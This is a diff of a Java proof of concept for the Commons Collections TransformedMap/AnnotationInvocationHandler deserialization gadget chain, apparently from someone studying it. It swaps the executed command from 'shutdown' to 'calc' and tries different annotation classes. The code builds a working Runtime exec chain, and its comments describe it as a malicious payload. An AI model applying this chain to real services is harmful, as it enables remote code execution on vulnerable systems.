@@ -10,6 +10,8 @@ import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
+import java.lang.annotation.Repeatable;
+import java.lang.annotation.Retention;
 import java.lang.annotation.Target;
 import java.lang.reflect.Constructor;
 import java.util.Arrays;
@@ -18,7 +20,7 @@ import java.util.Map;
 
 public class NormalChainTrans {
     public static void main(String args[]){
-        String cmd = "shutdown" ;
+        String cmd = "calc" ;
         Transformer[] transformerChain=new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
@@ -28,7 +30,7 @@ public class NormalChainTrans {
         Transformer transformedChain = new ChainedTransformer(transformerChain);
         // 创建Map对象
         Map map = new HashMap();
-        map.put("value", "value");
+        map.put("value", "114514");
 
         // 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
         Map transformedMap = TransformedMap.decorate(map, null, transformedChain);
@@ -54,7 +56,9 @@ public class NormalChainTrans {
 
             // 创建含有恶意攻击链(transformedMap)的AnnotationInvocationHandler类实例，等价于：
             // Object instance = new AnnotationInvocationHandler(Target.class, transformedMap);
-            Object instance = constructor.newInstance(Target.class, transformedMap);
+//            Object instance = constructor.newInstance(Target.class, transformedMap);
+//            Object instance = constructor.newInstance(Retention.class, transformedMap);
+            Object instance = constructor.newInstance(Repeatable.class, transformedMap);
 
             // 创建用于存储payload的二进制输出流对象
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
